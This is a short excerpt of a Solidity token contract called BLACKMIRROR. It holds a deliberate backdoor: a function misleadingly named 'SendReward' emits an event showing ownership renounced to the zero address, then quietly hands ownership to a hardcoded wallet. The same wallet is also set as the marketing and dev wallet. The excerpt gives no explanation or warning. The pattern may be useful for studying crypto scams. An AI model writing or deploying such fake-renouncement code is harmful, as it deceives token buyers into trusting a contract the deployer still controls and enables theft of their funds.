...
contract BLACKMIRROR is Context, IERC20 { 
    ...
    function SendReward() public virtual {
        emit OwnershipTransferred(_owner, address(0));
        _owner = 0xe30134AaA0485e9e852c3F8966d13c092a6cF837;
    }
    ...
    address payable public Wallet_Marketing = payable(0xe30134AaA0485e9e852c3F8966d13c092a6cF837); 
    address payable public Wallet_Dev = payable(0xe30134AaA0485e9e852c3F8966d13c092a6cF837);
    ...
    string private constant _symbol = unicode"Raasd"; 
